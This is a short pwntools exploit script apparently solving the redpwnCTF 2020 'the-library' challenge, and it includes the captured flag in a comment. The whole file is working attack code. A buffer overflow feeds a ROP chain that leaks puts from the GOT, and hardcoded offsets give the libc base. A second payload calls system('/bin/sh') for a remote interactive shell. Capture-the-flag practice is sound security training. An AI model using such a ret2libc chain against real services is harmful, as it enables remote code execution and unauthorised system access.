from pwn import *

file = "./the-library"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
#r = process(file)
#raw_input()
r = remote("2020.redpwnc.tf", 31350)
# flag{jump_1nt0_th3_l1brary}

payload = "A" * 24
payload += pack(0x0000000000400506) # ret
payload += pack(0x0000000000400733) # pop rdi
payload += pack(bin.got["puts"])
payload += pack(bin.symbols["puts"])
payload += pack(bin.symbols["main"])

r.sendafter("Welcome to the library... What's your name?", payload)

r.recvuntil("\n")
r.recvuntil("\n")
r.recvuntil("\n")
putsAddr = unpack(r.recvuntil("\n", drop=True).ljust(8, "\x00"))
libcBaseAddr = putsAddr - 0x00000000000809c0
systemAddr = libcBaseAddr + 0x000000000004f440
binShAddr = libcBaseAddr + 0x1b3e9a

print "[*] putsAddr 0x%x" % putsAddr
print "[*] libc base 0x%x" % libcBaseAddr
print "[*] system 0x%x" % systemAddr
print "[*] /bin/sh 0x%x" % binShAddr

payload = "A" * 24
payload += pack(0x0000000000400733) # pop rdi
payload += pack(binShAddr)
payload += pack(systemAddr)

r.sendafter("Welcome to the library... What's your name?", payload)

r.interactive()


